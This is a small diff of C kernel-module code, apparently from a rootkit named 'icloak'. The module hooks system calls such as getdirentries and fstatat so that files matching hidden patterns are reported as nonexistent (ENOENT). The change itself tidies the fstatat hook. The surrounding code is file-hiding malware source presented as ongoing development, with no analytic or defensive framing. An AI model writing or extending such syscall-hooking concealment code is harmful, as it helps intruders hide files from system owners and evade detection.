@@ -163,7 +163,6 @@ int native_show_file(const char *pattern) {
             }
         }
 
-
         if (getdirentries_syscall != NULL) {
             if (kook(SYS_getdirentries, getdirentries_syscall, NULL) == 0) {
                 getdirentries_syscall = NULL;
@@ -180,8 +179,6 @@ static int icloak_fstatat(struct thread *td, struct fstatat_args *uap) {
     matches = icloak_match_filename(uap->path, g_icloak_hidden_patterns);
 
     if (matches) {
-        memset(uap, 0, sizeof(struct fstatat_args));
-        td->td_retval[0] = ENOENT;
         return ENOENT;
     }
 
